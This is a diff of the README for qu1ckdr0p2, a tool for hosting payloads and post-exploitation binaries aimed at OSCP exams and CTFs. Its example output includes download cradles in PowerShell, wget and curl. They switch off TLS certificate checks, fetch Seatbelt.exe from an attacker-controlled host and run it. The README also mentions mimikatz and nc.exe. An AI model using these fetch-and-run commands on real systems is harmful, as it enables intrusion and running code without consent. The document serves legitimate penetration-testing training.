@@ -1,101 +1,88 @@
-
 <h1 align="center">
-    <img src="img/quick_drop_small.png"</img>
+    <img src="img/quick_drop_small.png"></img>
+
+![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
+![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white)
+![Visual Studio Code](https://img.shields.io/badge/Visual%20Studio%20Code-0078d7.svg?style=for-the-badge&logo=visual-studio-code&logoColor=white)
+![Prettier](https://img.shields.io/badge/prettier-1A2C34?style=for-the-badge&logo=prettier&logoColor=F7BA3E
+)
 </h1>
 
-<h4 align="center">Rapidly host payloads and post-exploitation bins over http or https.</h4>
-<h6 align="center">Designed to be used on exams like OSCP / PNPT or CTFs HTB / etc.</h4>
-<h6 align="center">Pull requests and issues welcome. As are any contributions.</h4>
-
-<p align="center">
-  <a href="#install">Install</a> •
-  <a href="#install">About</a> •
-  <a href="#examples">Examples</a> •
-  <a href="#license">License</a>
-</p>
-
 ## About
-Host files fast using aliases, specify a directory (-d), or specify a file (-f). Set serv.py as an alias to use it anywhere. Supports hosting over http or https. If https is chosen it will generate a certificate and use it automatically. The interface is chosen by priority, if tun0 is up then tun0 will be used, otherwise, it will use eth0. Download tooling to serve or set your own aliases using the ini files. Downloads require a GitHub API token.
+Rapidly host payloads and post-exploitation bins over HTTP or HTTPS. 
+Designed to be used on exams like OSCP / PNPT or CTFs HTB / etc.
 
-Qu1ckdr0p comes with some tools in windows/ and linux/ by default, along with some default repos in config/repos.ini. Not all of the default tools have compiled binaries released in their source code repos (e.g.: ghostpack) so compiled ones are included without the release repo added. Running `serv.py update` (requires github api key) will reach out to the repos configured in config/repos.ini, download them, and move them into the correct platform directory. All of the tools in the qu1ckdr0p repo and all of the Kali default tools (or most of them) also have a built-in alias.
+Pull requests and issues welcome. As are any contributions.
+Qu1ckdr0p2 comes with an alias and search feature. The tools are located in the <a href ="https://github.com/byinarie/qu1ckdr0p2-tools">qu1ckdr0p2-tools</a> repository.
+
+By default it will generate a self-signed certificate to use when using the `--https` option, priority is also given to the `tun0` interface when the webserver is running, otherwise it will use `eth0`.
+
+The <a href="https://github.com/byinarie/qu1ckdr0p2-tools/blob/main/config/common.ini">common.ini</a> defines the mapped aliases used within the `--search and -u` options.
+
+When the webserver is running there are several download cradles printed to the screen to copy and paste.
 
 ## Install
+#### Using pip is the only supported way of installing. Cloning this repository to install will probably break something
 ```zsh
-git clone https://github.com/byinarie/qu1ckdr0p.git /opt/qu1ckdr0p
-cd /opt/qu1ckdr0p/ 
-poetry install
-sudo apt install kali-tools-windows-resources
-sudo apt install kali-tools-post-exploitation
-alias serv="python3 /opt/qu1ckdr0p/serv.py" (or add to ~/.zshrc)
+pip3 install qu1ckdr0p2
+serv init --update
 ```
 
-## Examples 
-
-### Basic usage
-#### Defaults to http:80 over iface tun0
-
+## Usage
+### Serv a single file located in your current working directory
 ```zsh
-serv.py serve -d /path 
-serv.py serve -d /path --https --port 443
-serv.py serve -f /path/file.bin --https --port 443
-serv.py serve linux --https --port 443
-serv.py serve windows --https --port 443
-serv.py serve seatbelt --https --port 443
-serv.py serve mimikatz --https --port 443
-serv.py list --search "mimikatz"
-serv.py list
+serv serve --help
+serv serve -f implant.bin --https 443
+serv serve -f file.example --http 8080
 ```
 
-### Serve a windows privilege escalation directory over HTTPS 8443
-
+### Serv a file from a mapped alias
+The mapped alias numbers for the `-u` option are dynamic so you don't have to remember specific numbers or ever type out a tool name.
 ```zsh
-serv.py serve windows --https --port 8443
-# Pre configured post windows directory is: ./windows = /windows
-# see: config/common.ini
+$ serv serve --search seatbelt
+[→] Path: ~/.qu1ckdr0p2/windows/Seatbelt.exe
+[→] Alias: seatbelt
+[→] Use: 1
+
+[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
+[→] Alias: seatbelt_net40_any
+[→] Use: 2
+
+[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x64/Seatbelt.exe
+[→] Alias: seatbelt_net40_x64
+[→] Use: 3
+
+[→] Path: ~/.qu1ckdr0p2/windows/NetFramework_4.0_x86/Seatbelt.exe
+[→] Alias: seatbelt_net40_x86
+[→] Use: 4
+
+(...)
+
+$ serv serve --search seatbelt -u 2
+[→] Serving: ../../../.qu1ckdr0p2/windows/NetFramework_4.0_Any/Seatbelt.exe
+[→] Protocol: https
+[→] IP address: 192.168.1.5
+[→] Port: 443
+[→] Interface: eth0
+[→] Using cert: /home/byinarie/.qu1ckdr0p2/certs/cert.pem
+[→] Using key: /home/byinarie/.qu1ckdr0p2/certs/key.pem
+[→] CTRL+C to quit
+
+[→] URL: https://192.168.1.5:443/Seatbelt.exe
+
+[↓] csharp_ignore_tls:
+Add-Type -TypeDefinition "using System.Net;using System.Security.Cryptography.X509Certificates;public class SSLValidator {public static void Ignore() {ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;}}" -Language CSharp; [SSLValidator]::Ignore(); $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe');Start-Process 'c:\windows\temp\Seatbelt.exe'
+
+[↓] wget_ignore_tls:
+wget --no-check-certificate https://192.168.1.5:443/Seatbelt.exe -O /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe
+
+[↓] curl_ignore_tls:
+curl -k https://192.168.1.5:443/Seatbelt.exe -o /tmp/Seatbelt.exe && chmod +x /tmp/Seatbelt.exe && /tmp/Seatbelt.exe
+
+[↓] powershell_ignore_tls:
+$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('https://192.168.1.5:443/Seatbelt.exe', 'c:\windows\temp\Seatbelt.exe'); Start-Process 'c:\windows\temp\Seatbelt.exe'
 ```
-<p><img src="img/serve_windows.jpg"</img>
 
-### Serve the working directory
-
-```zsh
-serv.py serve 
-```
-<p><img src="img/working_dir.jpg"</img></p>
-
-### List currently configured aliases and search for a specific bin
-
-```zsh
-serv.py serve list --search winpeas
-serv.py serve list 
-
-```
-
-<p><img src="img/list_search_winpeas.jpg"</img>
-
-
-### Serve a single file over HTTPS 8443
-
-```zsh
-serv.py serve -f /usr/share/windows-resources/binaries/nc.exe --https --port 8443
-```
-<p><img src="img/serv_single_file.jpg"</img><p>
-
-
-### Serve a directory over the default http:80
-
-```zsh
-serv.py serve -d /usr/share/windows-resources/binaries
-```
-<p><img src="img/serve_directory.jpg"</img></p>
-
-### Download default tools
-#### First add your github api token to config/settings.ini
-#### Modify config/repos.ini as needed
-
-```zsh
-serv.py update
-```
-<p><img src="img/update.jpg"</img></p>
 
 
 
